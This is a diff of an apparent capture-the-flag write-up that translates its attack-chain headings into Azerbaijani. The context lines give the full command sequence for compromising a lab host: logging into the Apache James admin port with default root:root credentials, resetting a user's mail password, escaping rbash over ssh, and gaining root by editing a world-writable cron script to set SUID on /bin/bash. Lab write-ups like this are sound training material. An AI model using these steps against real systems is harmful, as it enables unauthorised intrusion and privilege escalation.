@@ -10,12 +10,12 @@
 ## Hücum Zənciri
 
 ```text
-Reconnaissance
+Kəşfiyyat
 ├── nmap -sC -sV -A → 22 (SSH), 25 (SMTP), 80 (Apache 2.4.25), 110 (POP3), 119 (NNTP)
 ├── nmap -p- → 4555 (rsip / Apache James admin)
 └── nc 10.129.1.53 4555 → root:root
 
-Foothold (Apache James)
+İlkin Giriş (Apache James)
 ├── help → listusers → james, thomas, john, mindy, mailadmin
 ├── setpassword mindy writeup
 ├── telnet 10.129.1.53 110 → USER mindy / PASS writeup
@@ -28,7 +28,7 @@ Escaping rbash
 ├── ssh mindy@10.129.1.53 'ln -s /bin/bash /home/mindy/bin/bash'
 └── ssh mindy@10.129.1.53 → bash -ip
 
-Privilege Escalation
+Səlahiyyətlərin Artırılması
 ├── LinEnum.sh → /opt/tmp.py (world-writable, root-owned)
 ├── cat /opt/tmp.py → os.system('rm -r /tmp/*')
 ├── nano /opt/tmp.py → replace with os.system('chmod +s /bin/bash')
